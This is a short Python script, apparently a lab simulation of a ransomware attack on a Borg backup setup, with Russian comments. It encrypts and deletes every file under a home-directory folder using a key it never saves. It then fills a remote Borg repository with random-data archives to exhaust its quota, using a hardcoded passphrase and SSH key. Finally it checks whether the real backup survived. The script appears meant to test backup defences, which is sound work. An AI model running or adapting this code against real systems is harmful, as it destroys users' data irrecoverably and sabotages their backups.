#!/usr/bin/env python3
import os, subprocess, logging
from pathlib import Path
from cryptography.fernet import Fernet

logging.basicConfig(level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.FileHandler('/tmp/sim_f.log'),
              logging.StreamHandler()])
log = logging.getLogger(__name__)
KEY = Fernet.generate_key()
CIPHER = Fernet(KEY)

def encrypt_file(f):
    try:
        data = open(f,'rb').read()
        open(str(f)+'.locked','wb').write(CIPHER.encrypt(data))
        os.remove(f); return True
    except: return False

# Шаг 1: шифруем файлы жертвы
target = Path(os.path.expanduser('~/important_data'))
enc = sum(1 for f in target.rglob('*')
          if f.is_file() and not str(f).endswith('.locked')
          and encrypt_file(f))
log.info(f'Victim files encrypted: {enc}')

# Шаг 2: заполняем хранилище мусорными данными
REMOTE = 'borguser@192.168.56.20:/store/borg_remote'
ENV = {**os.environ,
       'BORG_PASSPHRASE': 'RemoteBackup2024!',
       'BORG_RSH': 'ssh -i /home/testuser/.ssh/backup_key'}

log.warning('=== Starting quota exhaustion ===')
i = 0
while i < 200:
    i += 1
    r = subprocess.run(
        ['borg', 'create', '--stats',
         '--stdin-name', f'junk_{i}.bin',
         f'{REMOTE}::junk-{i:04d}', '-'],
        input=os.urandom(50 * 1024 * 1024),
        env=ENV, capture_output=True)
    if r.returncode == 0:
        log.warning(f'Junk archive {i} created (50 MB unique data)')
    else:
        stderr = r.stderr.decode(errors='ignore')
        if 'Broken pipe' in stderr or 'Connection' in stderr:
            log.info(f'CONNECTION BLOCKED after {i} archives — attack stopped!')
            log.info(f'Server response: {stderr[:200]}')
        else:
            log.error(f'Error: {stderr[:200]}')
        break

# Шаг 3: проверяем что реальный бэкап цел
r = subprocess.run(['borg', 'list', REMOTE], env=ENV,
                   capture_output=True, text=True)
real = [l for l in r.stdout.split('\n') if 'backup-before-attack' in l]
if real:
    log.info(f'REAL BACKUP INTACT: {real[0]}')
else:
    log.warning('Cannot verify real backup — connection may be blocked')
